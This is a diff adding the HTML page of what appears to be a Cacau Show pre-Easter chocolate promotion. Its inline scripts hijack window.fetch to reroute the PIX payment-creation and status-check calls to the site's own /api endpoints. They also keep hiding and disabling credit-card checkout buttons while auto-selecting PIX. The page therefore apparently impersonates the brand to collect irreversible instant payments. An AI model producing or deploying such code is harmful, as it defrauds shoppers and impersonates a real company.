@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="pt-BR">
+
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Promocao Pre-Pascoa | Cacau Show</title>
+    <meta name="description" content="Promocao Pre-Pascoa Cacau Show - Aproveite os melhores precos em chocolates!">
+    <meta name="author" content="Cacau Show" />
+
+    <link rel="preload" as="image" href="products/dreams-brownie-1.png" />
+    <link rel="preload" as="image" href="products/dreams-dubai-pistache.png" />
+    <link rel="preload" as="image" href="products/dreams-mil-folhas.png" />
+
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Promocao Pre-Pascoa Cacau Show">
+    <meta property="og:description" content="Aproveite os melhores precos em chocolates Cacau Show!">
+
+    <script>
+      (function () {
+        if (typeof window === "undefined" || typeof window.fetch !== "function") {
+          return;
+        }
+
+        var originalFetch = window.fetch.bind(window);
+
+        function resolveUrl(input) {
+          if (typeof input === "string") return input;
+          if (input && typeof input.url === "string") return input.url;
+          return "";
+        }
+
+        window.fetch = function (input, init) {
+          var url = resolveUrl(input);
+
+          if (url.indexOf("/functions/v1/create-pix-transaction") !== -1) {
+            return originalFetch("/api/create-pix-transaction", init);
+          }
+
+          if (url.indexOf("/functions/v1/check-transaction-status") !== -1) {
+            var normalizedUrl = url;
+            try {
+              normalizedUrl = new URL(url, window.location.origin).toString();
+            } catch (_) {}
+
+            var query = normalizedUrl.indexOf("?") !== -1 ? normalizedUrl.slice(normalizedUrl.indexOf("?")) : "";
+            return originalFetch("/api/check-transaction-status" + query, init);
+          }
+
+          return originalFetch(input, init);
+        };
+      })();
+    </script>
+    <script>
+      (function () {
+        if (typeof window === "undefined" || typeof document === "undefined") {
+          return;
+        }
+
+        function normalizeText(value) {
+          return String(value || "")
+            .normalize("NFD")
+            .replace(/[\u0300-\u036f]/g, "")
+            .toLowerCase();
+        }
+
+        function enforcePixOnly() {
+          var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
+          var pixToggle = null;
+
+          buttons.forEach(function (btn) {
+            var text = normalizeText(btn.textContent);
+
+            if (!pixToggle && text.indexOf("pix") !== -1 && text.indexOf("desconto") !== -1) {
+              pixToggle = btn;
+            }
+
+            if (
+              text.indexOf("cartao de credito") !== -1 ||
+              text.indexOf("finalizar via cartao") !== -1
+            ) {
+              btn.style.display = "none";
+              btn.disabled = true;
+            }
+          });
+
+          if (pixToggle && !pixToggle.dataset.pixSelectedForced) {
+            pixToggle.dataset.pixSelectedForced = "1";
+            pixToggle.click();
+          }
+        }
+
+        enforcePixOnly();
+
+        var observer = new MutationObserver(function () {
+          enforcePixOnly();
+        });
+
+        observer.observe(document.documentElement, {
+          childList: true,
+          subtree: true,
+        });
+      })();
+    </script>
+    <script type="module" crossorigin src="assets/index-SbekvIi0.js"></script>
+    <link rel="stylesheet" crossorigin href="assets/index-CQVhuwHR.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"b122873502cf4fcf9ab57531cc4f28c6","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+
+
+
